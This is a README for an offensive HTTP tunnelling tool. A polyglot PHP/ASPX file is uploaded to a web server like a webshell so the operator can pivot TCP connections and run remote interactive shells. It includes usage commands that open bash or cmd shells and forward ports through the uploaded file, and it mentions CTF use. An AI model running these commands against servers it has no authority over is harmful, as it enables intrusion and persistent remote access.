# HTTP Pivot - Yet another HTTP Tunnel

Pivot TCP connections through a `http` server (by uploading a `php` or
`aspx` file). Ideal in situations where bind/reverse shells do not
work, and hence tools like [chisel][chisel] are troublesome
too. Currently supports running remote interactive processes
(i.e. shells) or connecting to tcp services on the other side of the
http server.

The project is similar to [Tunna][tunna] and
[ChunkyTuna][chunky]. However, differs in architecture in that the
`read` function (i.e. getting output of interactive process) is by
design a blocking operation with a 5 second timeout. Thus, as soon as
data is available it is returned to the client without excessive
polling.

* In [Tunna][tunna], it configures the socket as non-blocking and is
polled (and hence a bit slow).
* In [ChunkyTuna][chunky], it uses a chunked http transfer. While this
  is a nice solution as it streams data directly back to the client
  when its available. Alas, chunked transfer encoding is [limited to
  HTTP/1.1][transfer-encoding], and hence is not future proof for
  HTTP2 and HTTP3 as they use a different method. Also, possible
  compatibility issues with proxies that can try to buffer responses.

There are also issues of having long running processes sitting in a
webserver, which are designed to run lots of short lived
threads. E.g. in ASPX its required to set the page into debug mode to
prevent it killing pages that take a long time to load.

The solution used by this project was to use a scripting language
(python/powershell) to provide a backend webserver that hosts the
feature. Then all the webserver does is proxy requests between the
client and the backend service.

```text

 socket-shell.py         [Local Machine]
      /|\
       |   HTTP
      \|/
 socket.php/socket.aspx  [Remote Server]
      /|\
       |   HTTP (loopback)
      \|/
 python/powershell       [Remote Server]
       |
       |--- OR ------------------------------------------
       |                                                |
       |   Pipe                                         |   TCP/IP
      \|/                                              \|/
  process, e.g. sh or cmd                         remote service
       
```


The reason I chose to separate out the backend is two fold:

1. While exploring chunked transfers, streaming blocks (in HTTP/2) and
   web sockets it became clear there were a number of possible issues:
   size of code (esp. when supporting multiple streaming
   technologies), quirks of specific http servers, legacy application
   firewalls and web proxies (e.g. `nginx` proxy will by default
   buffer responses).
2. Pushing complexity into both the `socket-shell.py` and backend
   scripts allow for communication over basic HTTP `GET` and `POST`
   requests. This avoids many of the issues with above point.  Think
   of the `socket.php`/`socket.aspx` as simple proxies that have no
   state information and just forward HTTP requests.

To keep deployment simple the `socket.php`/`socket.aspx` are
polyglots. Thus, all that is needed is to be done is place one of
these files on the remote server (as if it were a *webshell*) and
connect to it using `socket-shell.py`.

## Usage

```text
usage: socket-shell.py [-h] (--cmd CMD | --connect SPEC) [--raw] [--auth CREDS] URL

Exfiltration shell.

positional arguments:
  URL             url of socket.php

optional arguments:
  -h, --help      show this help message and exit
  --cmd CMD       command to execute, e.g. "sh" or "script -qfc bash /dev/null"
  --connect SPEC  port forward from remote service to local host. SPEC is similar to as ssh's -L,
                  i.e. localaddr:localport:remoteaddr:remoteport.
  --raw           set local terminal into raw mode (and restore on exit), valid for --cmd when
                  directly starting up a pty shell.
  --auth CREDS    basic auth credentials like user:pass
```

### Examples

Creating and connecting to a remote shell ([`rlwrap`][rlwrap] is
optional):

```text
rlwrap socket-shell.py --cmd bash http://1.2.3.4/uploads/socket.php
rlwrap socket-shell.py --cmd cmd http://1.2.3.4/uploads/socket.aspx
```

Creating and connection to a remote pty shell (notice the use of `--raw`):
```text
./socket-shell.py --cmd 'script -qfc bash /dev/null' --raw http://1.2.3.4/uploads/socket.php
```

Forwarding localhost port 8080 to a remote web service:
```text
./socket-shell.py --connect 127.0.0.1:8080:192.168.76.44:80 http://1.2.3.4/uploads/socket.php
```

## Remarks

I was unable to create powershell code that used native commands. The
option I considered were to either use a socket and manually parse the
HTTP or use the [`HttpListner`][httplistener] class (I might have
missed another option). To simplify the code, I opted for the
latter. However, I was unable to get it to work reliably using just
powershell constructs as it needed to allow for multi-threading due to
the design of `socket-shell.py`. I attempted to use both [Run
Spaces][runspace] and [Async operations][begingetcontext], however in
both cases it started working ok but after a small number of requests
it would stop servicing them (also the performance was very bad). In
the end, I resulted to using [`Add-Type`][addtype] to load a simple
`c#` class that uses the [`HttpListner`][httplistener] to create a
http server, the powershell script became a wrapper. This has the
advantage, in cases where powershell is restricted (e.g. constrained
language mode), it is straight forward to extract this class and
compile it into an `exe` and upload it with minimal changes.

The client script supports a `--raw` flag that supports putting the
terminal into `raw` mode for running remote `pty`s. To support this,
the script catches each key press and sends it to the remote
server. While this is useful with `pty` based remote shells, it
non-`pty` shells loose the option of running within a python command
loop (to take advantage of readline). To ameliorate this, its
recommended to wrap execution within [`rlwrap`][rlwrap] when connection to a
non-`pty` shell.


## Limitations

The current code is very much a proof of concept. Apart from using it
on a couple CTF style boxes it has not been properly stressed.

Also, please be aware that everything is sent in plaintext.

There is no error handling, if a request fails it is not retried.

### TODO / Wish list

I dont think any of the following particularly difficult to implement,
there just has not been a need yet.

1. Support UDP.
2. Support TCP listen.
3. Integrate front end with a SOCKS server.
4. Add encryption.
5. Consider cases where HTTP requests fail.
6. Add `Cache-Control` headers.

## Other Bits

Copyright 2021, Karim Kanso. All rights reserved. Licensed under GPLv3.


[tunna]: https://github.com/SECFORCE/Tunna "GitHub: Tunna"
[chunky]: https://github.com/SecarmaLabs/chunkyTuna "GitHub: ChunkyTuna"
[transfer-encoding]: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding "Mozilla: Transfer-Encoding"
[httplistener]: https://docs.microsoft.com/en-us/dotnet/api/system.net.httplistener "Microsoft: HttpListener"
[runspace]: https://devblogs.microsoft.com/scripting/beginning-use-of-powershell-runspaces-part-1/ "Microsoft: Beginning Use of PowerShell Runspaces"
[begingetcontext]: https://docs.microsoft.com/en-us/dotnet/api/system.net.httplistener.begingetcontext "Microsoft: HttpListener.BeginGetContext"
[addtype]: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type "Microsoft: Add-Type"
[rlwrap]: https://linux.die.net/man/1/rlwrap "Linux man page: rlwrap"
[chisel]: https://github.com/jpillora/chisel "GitHub: chisel"
